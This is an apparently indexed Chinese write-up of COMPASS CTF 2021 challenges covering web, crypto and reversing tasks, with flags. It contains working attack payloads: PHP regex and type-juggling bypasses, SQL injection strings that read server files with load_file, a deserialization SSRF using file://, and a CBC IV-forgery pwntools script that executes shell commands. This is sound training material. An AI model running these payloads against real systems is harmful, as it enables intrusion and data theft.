\u9002\u7528\u4e8ewindows\uff0c\u652f\u6301\u5404\u79cd\u5bc6\u7801\u6062\u590d\u65b9\u5f0f\uff08\u660e\u6587\uff0c\u66b4\u529b\uff0c\u5b57\u5178\uff0c\u63a9\u7801...\uff09\u7528\u65f69\u5206\u949f \u9700\u8981\u6ce8\u518c  - passware for forensic \u6781\u5176\u5f3a\u5927\u7684\u5185\u5b58\u5bc6\u7801\u5206\u6790\u653b\u51fb\uff0c\u4e5f\u652f\u6301\u5b57\u5178\uff0c\u7528\u65f64\u5206\u949f\uff0c\u9700\u8981\u6ce8\u518c </p> <p>flag{Brut3_f0rc3_1s_just_345y}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#web","title":"Web","text":""},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#hacked","title":"Hacked","text":"<p>\u9898\u76ee\u95ee  *js\u4e2d'b'+'a'+ +'a'+'a'* \u7684\u503c\u662f\uff1f \u90a3F12\u653e\u63a7\u5236\u53f0\u8fd0\u884c\u4e00\u4e0b\u5c31\u597d\u4e86\uff0c\u662f 'baNaNa'** \u4e00\u60f3\u5f88\u5947\u602a\uff0c\u4f46\u662f\u5728JS\u91cc\uff0c\u8fd9\u4e5f\u6b63\u5e38\uff08x \u7136\u540e\u5c31\u5f97\u5230\u4e86\u6ee1\u5c4f\u98de\u7684flag  \u9898\u76ee\u540d\u5b57\u4e5f\u662f\u6765\u6e90\u4e8e\u6b64  </p> <p>\u4ec0\u4e48\uff1f\u8089\u773c\u770bflag\u592a\u96be\u4e86\uff1f\u89e3\u51b3\u65b9\u6cd5\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u4ee5\u4e0b\uff1a - \u4e70\u4e2a\u597d\u7528\u7684\u773c\u955c\u6216\u8005\u627e\u51c6\u65f6\u673aOCR\u4e00\u4e0bflag - \u628a\u88ab\u52a0\u5bc6\u7684JS\u653e\u5230\u5728\u7ebfJS\u538b\u7f29\u7f51\u7ad9\u89e3\u5bc6\u5f97\u5230flag\u53d8\u91cf\u540d \u67e5\u770bt\u53d8\u91cf\u7684\u503c - \u901a\u8fc7window\u53d8\u91cf\u67e5\u770b\u6240\u6709\u53d8\u91cf\u7684\u503c \u5176\u4e2d\u5c31\u6709flag</p> <p>\u76f8\u4fe1\u5927\u5bb6\u53ef\u4ee5\u8f7b\u677e\u5b8c\u6210\u7b7e\u5230</p> <p>flag{Ev3ry_0ne_1ove5_baNaNa_exCept_fu*k1n9_js}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#trickyphp","title":"trickyPHP","text":"<p>\u7ed9\u4e86\u6e90\u7801\uff0c\u6765\u4e00\u70b9\u70b9\u8fc7\u5173\u3002\u7b2c\u4e00\u5173\u662f\u9700\u8981say\u4e2d\u5305\u542bJOIN_COMPASS_CTF#\uff0c\u4f46\u662f\u9996\u5148\u4f1a\u6b63\u5219\u5361\u6389COMPASS\u3002   </p> <pre><code>$say = preg_replace('/^(.*)COMPASS(.*)$/', '${1}&lt;!--nope--&gt;${2}', $_GET['say']);\n    if (preg_match('/JOIN_COMPASS_CTF#/', $say)) {\n        echo \"Welcome to COMPASS CTF, continue hacking!&lt;br&gt;\";\n    } else {\n        echo 'Bad hacker!';\n    }\n</code></pre> <p>\u6362\u884c\u7ed5\u8fc7\u6b63\u5219\uff0c\u7528url\u7f16\u7801\u907f\u514d#\u88ab\u89e3\u6790\u4e3ahtml\u6807\u7b7e\uff1a  </p> <p>?say=%0aJOIN_COMPASS_CTF%23</p> <p>\u7b2c\u4e8c\u5173\u9700\u8981post\u4e24\u4e2a\u5185\u5bb9\u4e0d\u540c\u4f46\u662fsha1\u4e00\u6837\u7684\u5185\u5bb9</p> <pre><code>if ($_POST['user'] == $_POST['pwd']) {\n    echo 'You cant do that!';\n} else if (sha1($_POST['user']) === sha1($_POST['pwd'])) {\n    echo 'Great, you almost get there!&lt;br&gt;';\n} else {\n    die(\"Not same, sorry.\");\n}\n</code></pre> <p>\u5f88\u5bb9\u6613\u60f3\u5230\u78b0\u649e\uff0c\u4f46\u662f\u5728php\u4e2d\u6709\u66f4\u7b80\u5355\u65b9\u6cd5\uff1a\u4f20\u5165\u975e\u5b57\u7b26\u4e32\u5185\u5bb9\uff0csha1\u4f1a\u8fd4\u56de\u5931\u8d25\uff0c\u9020\u6210false===false\uff0c\u6bd4\u5982\u4f20\u5165\u5185\u5bb9\u4e0d\u540c\u7684\u4e24\u4e2a\u6570\u7ec4\u3002  </p> <p>user[]=1&amp;pwd[]=2</p> <p>\u7b2c\u4e09\u5173\u89e3\u7801json\u683c\u5f0f\u7684flag\uff0c\u7136\u540e\u548cflag\u5f31\u6bd4\u8f83  </p> <pre><code>$leve1_3 = json_decode($_POST['flag']);\nif ($leve1_3-&gt;result == $flag) {\n    echo \"Congratulations, you won your flag:&amp;nbsp &amp;nbsp \" . $flag;\n} else {\n    echo \"So close!!!\";\n}\n</code></pre> <p>\u5f31\u6bd4\u8f83\u65f6\uff0c\u6211\u4eec\u53ef\u63a7\u7684\u53d8\u91cf\u5728\u5de6\u8fb9\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ee4\u5176\u4e3a0\u4f7f\u5f97\u6761\u4ef6\u6052\u6210\u7acb\u3002  </p> <p>flag={\"result\":0}</p> <p>\u7ec4\u5408\u8d77\u6765\u5c31\u662f</p> <p>GET(\"http://xx.xx/?say=%0aJOIN_COMPASS_CTF%23\")  user[]=1&amp;pwd[]=2&amp;flag={\"result\":0}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#life-restart","title":"Life Restart","text":"<p>\u770b\u4e00\u4e0b\u6587\u4ef6\u7ed3\u6784  \u4ece\u6587\u4ef6\u540d\u4e0d\u96be\u63a8\u6d4b - \u5f00\u5c40\u5929\u8d4b\u62bd\u5361\u7684\u76f8\u5173\u903b\u8f91\u4f4d\u4e8etalent.js     + \u7206\u6539\u6b27\u7687\u6982\u7387 \u663e\u71363\u662f\u6700\u597d\u7684 \u76f4\u63a5return3\u5c31\u80fd\u6b27\u7687\u9644\u4f53\uff1a     <code>javascript     const randomGrade = () =&gt; {             let randomNumber = Math.floor(Math.random() * 1000); //\u5220\u6389             if((randomNumber -= rate[3]) &lt; 0) return 3; //\u5220\u6389             if((randomNumber -= rate[2]) &lt; 0) return 2; //\u5220\u6389             if((randomNumber -= rate[1]) &lt; 0) return 1; //\u5220\u6389             return 0; //return 3         }</code> - \u5c5e\u6027\u5206\u914d\u7684\u76f8\u5173\u903b\u8f91\u4f4d\u4e8eproperty.js     + \u7206\u6539\u5f00\u5c40\u5c5e\u6027 \u52a0\u4e00\u5806\u521d\u59cb\u503c\uff1a     ```javascript     restart(data) {         this.#data = {             [this.TYPES.AGE]: -1,</p> <pre><code>        [this.TYPES.CHR]: 0, //\u52a0\uff01\n        [this.TYPES.INT]: 0, //\u52a0\uff01\n        [this.TYPES.STR]: 0, //\u52a0\uff01\n        [this.TYPES.MNY]: 0, //\u52a0\uff01\n        [this.TYPES.SPR]: 0, //\u52a0\uff01\n```\n</code></pre> <ul> <li>\u4e8c\u500d\u901f\u5ef6\u8fdf\u7684\u903b\u8f91\u5728app.js<ul> <li>\u5ef6\u8fdf\u6539\u4e3a0\uff1a <code>javascript     trajectoryPage         .find('#auto')         .click(()=&gt;auto(1000));     trajectoryPage         .find('#auto2x')         .click(()=&gt;auto(500)); // \u6539\u4e3a0</code></li> </ul> </li> </ul> <p>\u73b0\u5728\u5f00\u5c40\u5c31\u6709\u65e0\u9650\u5c5e\u6027+\u5168\u6a59\u5361 \u5f00\u59cb\u4f60\u7684\u9006\u5929\u4e4b\u8def\u5427\uff01 \u4e0d\u4e00\u5b9a\u80fd\u6e21\u52ab\u6210\u529f \u4f46\u662f\u56e0\u4e3a\u6539\u6389\u4e86\u5ef6\u8fdf\uff0c\u57fa\u672c\u4e00\u8f6e\u4e0d\u52305\u79d2 \u5f00\u51e0\u8f6e\u5c31\u80fd\u62ff\u5230flag\u3002  </p> <p>flag{My_fate_1s_up_to_M3_in_Cyber_W0rld}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#bbs","title":"BBS","text":"<p>\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7 \u767b\u5f55\u540e\u53d1\u73b0\u7f51\u9875\u4f1a\u5185\u5d4cblog\u4e2d\u7684\u7f51\u5740\uff0c\u540c\u65f6\u53d1\u73b0\u8bf7\u6c42\u7684\u53c2\u6570\u4e3a  </p> <p>view.php?no=2  </p> <p>\u52a0\u4e2a\u5206\u53f7\u8bd5\u8bd5 view.php?no=2'</p> <p>[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1  </p> <p>\u770b\u5230\u8fd9\u62a5\u9519\u4fe1\u606f\uff0cDNA\u52a8\u4e86 orderby\u7206\u5b57\u6bb5\u6570\u91cf\uff0c5\u65f6\u62a5\u9519\u8bf4\u660e\u5b57\u6bb5\u6570\u4e3a4  </p> <p>?no=1 order by 4# </p> <p>union select\u88ab\u5c4f\u853d \u7528/**/\u5c31\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u53d1\u73b0\u5b57\u6bb52\u53ef\u4ee5\u76f4\u63a5\u56de\u663e  </p> <p>?no=9 union/**/select 1,2,3,4#  </p> <p>\u8fd9\u65f6\u5019\u6709SQL\u6ce8\u5165\u5927\u4f6c\u53ef\u80fd\u4f1a\u5148\u770b\u770b\u6743\u9650</p> <p>?no=9 union/**/select 1,user(),3,4#  </p> <p>\u4e00\u67e5\u5413\u4e00\u8df3\uff0croot@localhost\uff0c\u90a3\u8fd8\u6ce8\u4ec0\u4e48\uff0c\u76f4\u63a5\u968f\u4fbf\u6253\u62ffflag\u4e86  </p> <p>?no=9 union/**/select 1,load_file(\"/var/www/html/flag.php\"),3,4#  </p> <p>\u6267\u884c\u540e\u5728\u7528\u6237\u540d\u7684\u5730\u65b9\u67e5\u770b\u6e90\u7801\u5c31\u80fd\u5f97\u5230flag   </p> <p>\u90a3\u5982\u679c\u4e0d\u662fSQL\u6ce8\u5165\u5927\u4f6c\uff0c\u6ca1\u6709\u4e00\u6b65\u62ff\u5230flag\uff0c\u6211\u4eec\u63a5\u7740\u5f80\u4e0b\u505a\uff1a \u67e5\u4fe1\u606f\u8868\u627e\u8868\u540d\uff0c\u5217\u540d \u5185\u5bb9  </p> <p>?no=9 union/**/select 1,(select table_name from information_schema.tables limit 1 offset 0),3,4#  </p> <p>?no=9 union/**/select 1,(select column_name from information_schema.columns where table_name='users' limit 1 offset 3),3,4#  </p> <p>?no=9 union/**/select 1,(select data from users where no=2),3,4# \u53ef\u4ee5\u77e5\u9053\u8868\u7684\u7ed3\u6784\u4e3a\uff1a - no \u7528\u6237id - name \u7528\u6237\u540d - password \u5bc6\u7801\u7684hash - data O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"a\";s:3:\"age\";i:1;s:4:\"blog\";s:20:\"http://www.baidu.com\";}</p> <p>\u5176\u4e2ddata\u770b\u8d77\u6765\u662f\u5e8f\u5217\u5316\u7684php\u5185\u5bb9\uff0c\u8bd5\u7740\u653e\u5230\u7ed3\u679c\u4e2d  </p> <p>?no=9 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"a\";s:3:\"age\";i:1;s:4:\"blog\";s:20:\"http://www.baidu.com\";}'#</p> <p>\u4f1a\u53d1\u73b0\u53cd\u5e8f\u5217\u5316\u4e86\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5019\u6709\u7ecf\u9a8c\u7684web\u5927\u4f6c\u53c8\u5df2\u7ecf\u60f3\u5230\u4e86\u4f2a\u534f\u8baeSSRF\u4e86\uff0c\u53ea\u9700\u8981\u66f4\u6539\u4e00\u4e0b\u5e8f\u5217\u5316\u7684\u5185\u5bb9\u5c31\u80fd\u8bfb\u51faflag \u6ca1\u6709\u60f3\u5230\u7684\u540c\u5b66\u4e5f\u53ef\u4ee5\u901a\u8fc7\u67e5\u770brobots.txt\u5f97\u5230\u6e90\u7801 \u67e5\u770b\u903b\u8f91\u5f97\u77e5\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b  </p> <p>?no=9 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"a\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'# </p> <p>\u6267\u884c\u540e\u5728bolg\u9884\u89c8\u7684\u5730\u65b9\u67e5\u770b\u6e90\u7801\u5c31\u80fd\u5f97\u5230flag   </p> <p>flag{U_mast3red_inj3ctiOn_Unser1alize_and_SSrF!}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#crypto","title":"Crypto","text":""},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#at_bash","title":"at_bash","text":"<p>\u6709\u5f88\u591a\u79cd\u65b9\u6cd5\u505a\uff0c\u5206\u4eab\u51e0\u4e2a\u81ea\u52a8\u5316\u7684\u89e3\u6cd5\uff0c\u4ee5\u4e0b\u4ed3\u5e93\u90fd\u5728github\u4e0a\u5f00\u6e90\uff0c\u5176\u4e2dCyberChief\u6709\u5728\u7ebf\u7248\u672c\uff1a - Ciphey \u53ef\u4ee5\u5168\u81ea\u52a8\u89e3\u51b3\u95ee\u9898  - BaseCrack \u53ef\u4ee5\u89e3\u51b3\u5927\u91cf\u7684base\u7f16\u7801  - CyberChief \u53ef\u4ee5\u81ea\u52a8\u89e3\u51b3\u5f88\u591a\u6b65\u9aa4 </p> <p>\u672c\u9898\u540d\u79f0\u63d0\u793a\u6700\u540e\u4e00\u6b65\u662fatbash\u89e3\u7801\uff0c\u5982\u679c\u6ca1\u6709\u60f3\u5230\u76f4\u63a5\u767e\u5ea6\u641c\u7d22\"ctf uozt{}\"\u6216\u8005\u641c\u7d22\"crypto uozt{}\"\u90fd\u80fd\u5f97\u5230\u89e3\u6cd5  </p> <p>flag{wOW_y0U_Real1y_ma5ter3d_enc0d1ng!}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#variable","title":"variable","text":"<p>\u6839\u636e\u5df2\u77e5\u7684flag{}\u683c\u5f0f\u5199\u51fa\u65b9\u7a0b\u6c42\u89e3abcd\uff1a  </p> <pre><code>from z3 import *\n\nsolver = Solver()\n\na = Real('a')\nb = Real('b')\nc = Real('c')\nd = Real('d')\nsolver.add(a * pow(ord('f'), 3) + b * pow(ord('f'), 2) + c * ord('f') + d == 5699462831574115)\nsolver.add(a * pow(ord('l'), 3) + b * pow(ord('l'), 2) + c * ord('l') + d == 6762178137517177)\nsolver.add(a * pow(ord('a'), 3) + b * pow(ord('a'), 2) + c * ord('a') + d == 4904006952609865)\nsolver.add(a * pow(ord('g'), 3) + b * pow(ord('g'), 2) + c * ord('g') + d == 5868227804276587)\nsolver.add(a * pow(ord('{'), 3) + b * pow(ord('{'), 2) + c * ord('{') + d == 9978816733414447)\nsolver.add(a * pow(ord('}'), 3) + b * pow(ord('}'), 2) + c * ord('}') + d == 10472292506842245)\nif solver.check() == sat:\n    for i in str(solver.model())[1:-1].split(\",\"):\n        print(i.strip())\n</code></pre> <p>\u89e3\u51faabcd\u7684\u503c\u540e\u5e26\u5165\u6c42\u89e3\uff1a  </p> <pre><code>b = 4849411009\na = 5322682364\nd = 4215800245\nc = 5218014711\nenc = [5699462831574115, 6762178137517177, 4904006952609865, 5868227804276587, 9978816733414447, 2555804598727387,\n       7339798412634739, 9038863758685179, 4607800653388515, 8591875579876765, 4607800653388515, 2012199806528365,\n       761800081770865, 8813480590313107, 718942790851879, 4607800653388515, 8374016791281969, 6040291893502029,\n       5533965039300429, 4607800653388515, 4904006952609865, 5056755384110247, 6215687035344625, 6762178137517177,\n       638111591795929, 3189435100987729, 9501092313613249, 4607800653388515, 8374016791281969, 7339798412634739,\n       4607800653388515, 1622988744649015, 7949410135240279, 9501092313613249, 7539405133434565, 8374016791281969,\n       600073811470597, 196738654989577, 10472292506842245]\n\nfor i in enc:\n    for j in range(32, 127):\n        if a * j ** 3 + b * j ** 2 + c * j + d == i:\n            print(chr(j), end=\"\")\n</code></pre> <p>\u5373\u5f97flag</p> <p>flag{Now_u_H4v3_the_abil1Ty_to_Crypt0!}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#cbc","title":"CBC","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u7ed9\u51fa\u7684\u5bc6\u6587\u53cd\u89e3IV\uff0c\u793a\u4f8b\u4ee3\u7801+\u8fd0\u884chello world</p> <pre><code>from pwn import *\nfrom Crypto.Util.Padding import pad\n\nlocal = True\n\nhost, port = \"103.102.44.218\", 10007\n\nif local:\n    p = process('python CBC.py', shell=True)\nelse:\n    p = remote(host,port)\n\np.recvuntil(b'sample encryption\\n')\nsample = p.recvline()\n\niv = unhex(sample[:32])\nct = unhex(sample[32:])\npt = b'trapped_forever'\n\nlog.info(f'got iv: {enhex(iv)}')\nlog.info(f'got ct: {enhex(ct)}')\nlog.info(f'got pt: {enhex(pt)}')\n\npt = pad(pt, 16)\npl = pad(b'print(\"hello\")', 16)\n\nlog.info(f'sending: {pl}')\nres = p.recvuntil(b'&gt;&gt;')\ntarget = xor(pt, pl)\nnew_iv = xor(target, iv)\n\nfinal_payload = enhex(new_iv) + enhex(ct)  \np.sendline(final_payload.encode())\np.interactive()\n</code></pre> <p>\u5f97\u5230\u4e86\u9884\u671f\u7ed3\u679c</p> <pre><code>$ python helloworld.py \n[+] Starting local process '/bin/sh': pid 379634\n[*] got iv: 2d9563e81f33b3501e1e362e0f6fb173\n[*] got ct: 2a835fcae4c11657a7b6ddae5a6e8ed1\n[*] got pt: 747261707065645f666f7265766572\n[*] sending: b'print(\"hello\")\\x02\\x02'\n[*] Switching to interactive mode\nhello\n&gt;&gt;\n</code></pre> <p>\u5c06hello world\u66ff\u6362\u6210\u6211\u4eec\u60f3\u8981\u7684\u547d\u4ee4\uff0c\u6e90\u7a0b\u5e8f\u5df2\u7ecf\u5bfc\u5165\u4e86OS\u5e93\uff0c\u4e0d\u9700\u8981\u518d\u6b21import\uff0c\u4e8e\u662f\u4f7f\u7528<code>os.system('ls -la')</code></p> <pre><code>#!/usr/bin/python3\n\nfrom pwn import *\nfrom Crypto.Util.Padding import pad\n\nlocal = True\n\nhost, port = \"103.102.44.218\", 10007\n\nif local:\n    p = process('python CBC.py', shell=True)\nelse:\n    p = remote(host,port)\n\np.recvuntil(b'sample encryption\\n')\nsample = p.recvline()\n\niv = unhex(sample[:32])\nct = unhex(sample[32:])\npt = b'trapped_forever'\n\nlog.info(f'got iv: {enhex(iv)}')\nlog.info(f'got ct: {enhex(ct)}')\nlog.info(f'got pt: {enhex(pt)}')\n\npt = pad(pt, 16)\n\ndef encpayload(s):\n    hexed = enhex(s)\n    encoded = '|\\\\x'.join([hexed[x:x+2] for x in range(0, len(hexed), 2)]).split('|')\n    parts = [f\"a='\\\\x{encoded[0]}'\"]\n    for i, p in enumerate(encoded[1:]):\n        parts.append(f\"a+='{p}'\")\n\n    return parts\n\n# any payload will do, we can keep appending anything to variable\npayload_list = encpayload(b'os.system(\"ls -la\")')\npayload_list.append('print(a)')\npayload_list.append('exec(a)') \n\nfor pl in payload_list:\n    res = p.recvuntil(b'&gt;&gt;')\n\n    pl = pad(pl.strip().encode(), 16)\n\n    target = xor(pt, pl)\n    new_iv = xor(target, iv)\n\n    final_payload = enhex(new_iv) + enhex(ct)  \n    p.sendline(final_payload.encode())\n\np.interactive()\n</code></pre> <p>\u7ed9\u51fa\u4e86\u60f3\u8981\u7684flag</p> <pre><code>$ ./solve.py \n[+] Opening connection to jail-crypto.challenge.cryptonite.team on port 1337: Done\n[*] got iv: 7f3468ee6bec6395f9a6a96eaf078612\n[*] got ct: c67bd34273a2f25477432de5590fcad2\n[*] got pt: 747261707065645f666f7265766572\nos.system(\"ls -la\")\ntotal 16\ndrwxr-xr-x 2 nobody nogroup 4096 Dec 10 13:44 .\ndrwxr-xr-x 3 nobody nogroup 4096 Dec 10 13:44 ..\n-rw-r--r-- 1 nobody nogroup   41 Dec  6 13:08 flag.txt\n-rw-r--r-- 1 nobody nogroup    0 Dec  6 13:08 flag{w0W_s3Ems_u_really_g00D_4t_crypt0!}\n-rwxr-xr-x 1 nobody nogroup 1387 Dec  6 13:08 CBC.py\n&gt;&gt;\n</code></pre>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#re","title":"Re","text":""},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#bogo","title":"bogo","text":"<p>\u7a0b\u5e8f\u9996\u5148\u5bf9char flag\u6570\u7ec4\u6bcf\u4e2a\u5143\u7d20+32\u5f97\u5230flag\uff0c\u7136\u540e\u5f00\u59cb\u968f\u673a\u751f\u6210\u53ef\u6253\u5370\u7684flag\u5b57\u7b26\u4e32\u8fdb\u884c\u6bd4\u8f83\u3002 \u5982\u679c\u751f\u6210\u7684\u968f\u673a\u5185\u5bb9\u6b63\u597d\u662f\u6b63\u786e\u7684flag\u5c31\u663e\u793a\u6b63\u786e\u7ed3\u675f\u7a0b\u5e8f\uff0c\u5982\u679c\u4e0d\u6b63\u786e\u5c31\u7ee7\u7eed\u968f\u673a\u751f\u6210\u3002 \u6211\u4eec\u53ef\u4ee5\uff1a - 1 \u8ba9\u7334\u5b50\u6162\u6162\u751f\u6210\uff0c\u53cd\u6b63\u627e\u5230\u6b63\u786eflag\u7684\u6982\u7387\u4e0d\u662f0  - 2 \u76f4\u63a5\u628aflag\u6570\u7ec4\u7684\u5185\u5bb9+32\u62ff\u5230flag</p> <p>\u76f8\u4fe1\u5927\u5bb6\u53ef\u4ee5\u5f88\u5feb\u505a\u51fa\u8fd9\u9053\u9898\u3002  </p> <p>flag{we1c0m3_tO_rEv3re_w0r1d!}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#extremely-slow","title":"Extremely slow","text":"<p>IDA\u6253\u5f00\uff0c\u53d1\u73b0\u662f\u4e0d\u719f\u6089\u7684\u754c\u9762 \u6709\u7ecf\u9a8c\u7684\u540c\u5b66\u4f1a\u76f4\u63a5\u770b\u51fd\u6570\u680f\u4e2d\u6700\u4e0a\u8fb9\u51e0\u4e2a\u51fd\u6570\u5c31\u662f\u5165\u53e3\u51fd\u6570  \u4f46\u662f\u6211\u4e0d\u559c\u6b22exe\uff0c\u4e5f\u4e0d\u77e5\u9053\u600e\u4e48\u627e\u5165\u53e3\u51fd\u6570\uff0c\u4e8e\u662f\u6309\u4e0bshift+F12\uff0c\u7d27\u63a5\u7740ctrl+F\uff0c\u8f93\u5165\"flag\"\uff0c\u6309\u4e0b\u56de\u8f66\uff0c\u4e00\u6574\u5957\u64cd\u4f5c\u4e00\u6c14\u5475\u6210\uff0c\u7136\u540e\u4e5f\u53ef\u4ee5\u627e\u5230\uff1a  \u53cc\u51fb\u7ed3\u679c\uff0c\u518d\u53cc\u51fbDATA XREF: sub_1400010C0\u8ddf\u8fdb\u5f15\u7528\u5c31\u627e\u5230\u4e86\u4e3b\u51fd\u6570  \u6309\u4e0bF5\uff0c\u4e3b\u51fd\u6570\u903b\u8f91\u5341\u5206\u6e05\u695a\u3002\u91cd\u547d\u540d\u51e0\u4e2a\u53d8\u91cf\u5c31\u80fd\u5f97\u5230\uff1a</p> <pre><code>__int64 sub_1400010C0(){\n  int l; // [rsp+20h] [rbp-38h]\n  int j; // [rsp+24h] [rbp-34h]\n  int k; // [rsp+28h] [rbp-30h]\n  int i; // [rsp+2Ch] [rbp-2Ch]\n  HANDLE hConsoleOutput; // [rsp+38h] [rbp-20h]\n  CONSOLE_CURSOR_INFO ConsoleCursorInfo; // [rsp+40h] [rbp-18h] BYREF\n  ULONGLONG v7; // [rsp+48h] [rbp-10h]\n\n  printf(\"You will find flag here!\\n\");\n  hConsoleOutput = GetStdHandle(0xFFFFFFF5);\n  SetConsoleTextAttribute(hConsoleOutput, 0xAu);\n  ConsoleCursorInfo.dwSize = 1;\n  ConsoleCursorInfo.bVisible = 0;\n  SetConsoleCursorInfo(hConsoleOutput, &amp;ConsoleCursorInfo);\n  v7 = GetTickCount64();\n  menset(flag_arr, 61i64, 1600i64);//61\u662f\"=\"\u7684ASCII\n  for ( i = 0; i &lt; 97; ++i ) //\u5faa\u73af97\u6b21\n  {\n    SetConsoleCursorPosition(hConsoleOutput, 0);\n    for ( j = 0; j &lt; 20; ++j )//\u603b\u517120\u884c\n    {\n      for ( k = 0; k &lt; 80; ++k )//\u6bcf\u884c80\u4e2a\u5b57\u7b26\n        putchar(flag_arr[80 * j + k]); //\u6253\u5370\u6bcf\u4e2a\u5b57\u7b26\n      printf(\"\\n\");//\u6253\u5370\u6362\u884c\u7b26\n    }\n    for ( l = 0; l &lt; 1600; ++l ) //data_arr\u662f97\u4e2achar[1600]\uff0c\u6b63\u597d\u6bcf\u4e2a\u5b57\u7b26\u90fd\u4ea6\u6216\u4e00\u6b21\n      flag_arr[l] ^= *(_BYTE *)(data_arr[i] + l);\n    Sleep(100);//\u6bcf\u8f6e\u90fd\u6682\u505c0.1\u79d2\n    if ( GetTickCount64() - v7 &gt; 4000 )\n        return 0i64;//\u5982\u679c\u7a0b\u5e8f\u8fd0\u884c\u65f6\u95f4\u8d85\u8fc74\u79d2\u9000\u51fa\u7a0b\u5e8f\n  }\n  system(\"pause &gt; nul\");\n  return 0i64;\n}\n</code></pre> <p>\u6240\u4ee5\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u521d\u59cb\u6570\u7ec4\u548c97\u4e2a\u7b49\u957f\u7684\u6570\u7ec4\u6bcf\u4e2a\u4ea6\u6216\u4e00\u6b21\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u8f93\u51fa \u4f46\u662f\u6bcf\u6b21\u4ea6\u6216\u5b8c\u90fd\u4f1a\u6682\u505c0.1\u79d2\uff0c40\u6b21\u4e4b\u540e\u5c31\u4f1a\u9000\u51fa\u3002 \u90a3\u4e48\u53ef\u4ee5\u8003\u8651\u7684\u89e3\u6cd5\u6709\uff1a - \u5bfc\u51fa97\u4e2a\u6570\u7ec4\uff0c\u7136\u540e\u6a21\u62df\u4ea6\u6216\u8fc7\u7a0b\u5f97\u5230\u6700\u7ec8\u8f93\u51fa - \u628asleep\u7981\u7528 - \u628a\u8d85\u65f6return\u7981\u7528</p> <p>\u89e3\u6cd51 \u7981\u7528sleep\uff1a \u627e\u5230Sleep\u51fd\u6570\u7684\u5730\u65b9\uff0cEdit -&gt; Patch Program -&gt; Assemble   \u5c06Sleep\u7684\u6beb\u79d2\u53c2\u6570\u4ece</p> <p>mov     ecx, 64h</p> <p>\u4fee\u6539\u4e3a</p> <p>mov     ecx, 0h</p> <p>\u70b9\u51fb\u786e\u5b9a\u4fee\u6539\u5b8c\u672c\u884c\u540eIDA\u8fd8\u4f1a\u81ea\u52a8Patch\u4e0b\u4e00\u884c\u6c47\u7f16\uff0c\u8fd9\u65f6\u5019\u53d6\u6d88\u5373\u53ef \u4e4b\u540e\u5e94\u7528\u4fee\u6539\uff0cEdit -&gt; Patch Program -&gt; Apply Patches to input file \u7136\u540e\u8fd0\u884c\u7a0b\u5e8f\u5373\u53ef\u770b\u5230\u6f02\u4eae\u7684flag </p> <p>\u89e3\u6cd52 \u963b\u6b62\u8d85\u65f6\uff1a \u7c7b\u4f3c\u65b9\u6cd51\uff0c\u4fee\u6539\u9650\u5236\u65f6\u95f4\u7684cmp     rax, 0FA0h\u4e3a\u66f4\u5927\u7684\u6570\u5b57 \u6216\u8005\u4fee\u6539\u8fd4\u56de\u5206\u652f\u7684\u8df3\u8f6c\u6761\u4ef6jbe     short loc_14000124D    </p> <p>\u89e3\u6cd53 \u6a21\u62df\u4ea6\u6216\u8fc7\u7a0b\uff1a  97\u4e2a\u6570\u7ec4\u5728\u7a0b\u5e8f\u4e8c\u8fdb\u5236\u4e2d\u662f\u8fde\u7eed\u7684\uff0c\u53ef\u4ee5\u8ba1\u7b97\u504f\u79fb\u91cf\u4e4b\u540e\u5165\u8bfb\u4e8c\u8fdb\u5236\u7136\u540e\u624b\u52a8\u5206\u5272\u6570\u636e  </p> <p>\u63a8\u8350\u89e3\u6cd51\uff0c\u4e00\u6b65\u5230\u4f4d\u3002</p> <p>flag{p47ch_PrO6r4m_1s_n0t_A_h4rd_7hin9}</p>"},{"location":"Writeup/COMPASS%20CTF2021/COMPASS_CTF_2021_ALLwp/#random","title":"Random","text":"<p>\u521d\u59cb\u968f\u673a\u79cd\u5b50\u6ca1\u6709\u968f\u673a\u5316\uff0c\u56e0\u6b64\u7b2c\u4e00\u4e2a\u968f\u673a\u6570\u4e5f\u662f\u5b9a\u503c\uff0c\u7528\u5176\u505a\u79cd\u5b50\u4e4b\u540e\u6574\u4e2a\u5e8f\u5217\u90fd\u662f\u56fa\u5b9a\u7684\uff0c\u4f46\u662f\u7a0b\u5e8f\u903b\u8f91\u662f\u6709\u5751\u7684\u4e0d\u597d\u590d\u73b0\u4ee3\u7801\uff0c\u6240\u4ee5\u52a8\u6001\u8c03\u8bd5\u83b7\u53d6\u6574\u4e2aXOR\u5e8f\u5217\u7684\u6700\u7ec8\u503c\uff1a \u6211\u9009\u62e9\u4f7f\u7528IDA\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\uff0c\u5728\u8fd9\u91cc\u4e0b\u65ad\u70b9 </p> 